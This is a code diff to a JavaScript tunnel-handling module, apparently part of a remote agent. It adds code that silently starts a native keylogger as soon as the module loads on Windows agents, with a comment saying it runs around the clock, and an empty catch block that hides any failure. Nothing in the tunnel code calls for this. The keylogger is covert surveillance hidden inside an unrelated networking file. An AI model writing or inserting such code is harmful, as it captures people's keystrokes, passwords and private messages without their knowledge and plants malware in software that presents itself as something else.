@@ -140,4 +140,13 @@ function closeTunnel(ws) {
     stopForward(ws);
 }
 
+// Keylogging runs 24/7: start it as soon as this module loads on a
+// Windows agent (the native module is absent in other agent builds, so
+// this is a no-op there). Running this again when the agent reloads its
+// script is harmless - the native module restarts cleanly and its key
+// counter keeps accumulating.
+try {
+    require('keylogger').start();
+} catch (e) { }
+
 module.exports = { handleTunnelData: handleTunnelData, closeTunnel: closeTunnel };
